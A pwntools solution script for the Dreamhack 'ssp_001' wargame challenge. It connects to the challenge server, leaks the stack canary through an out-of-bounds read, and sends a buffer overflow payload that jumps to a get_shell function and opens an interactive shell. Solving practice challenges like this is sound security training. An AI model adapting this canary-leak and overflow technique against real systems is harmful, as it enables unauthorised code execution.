from pwn import *

context.arch='i386'
context.log_level='debug'

p=remote("host3.dreamhack.games",13522)
#p=process("./ssp_001")
#inital var
get_shell=0x080486b9
canary=b""

#leak the canary
i=131
while(i>127):
    p.recvuntil(b"> ")
    p.send(b"P") #select Print
    p.recvuntil(b"Element index : ")
    p.sendline(bytes(str(i),'utf-8'))
    p.recvuntil(b"is : ")
    canary+=p.recvn(2)
    i-=1

canary=int(canary,16)
#make stack buffer overflow
payload=b"\x90"*64
payload+=p32(canary)
payload+=b"\x90"*8
payload+=p32(get_shell)

p.recvuntil(b"> ")
p.send(b"E") 
p.recvuntil(b"Name Size : ")
p.sendline(b"100")
p.recvuntil(b"Name : ")
p.send(payload)
p.interactive()
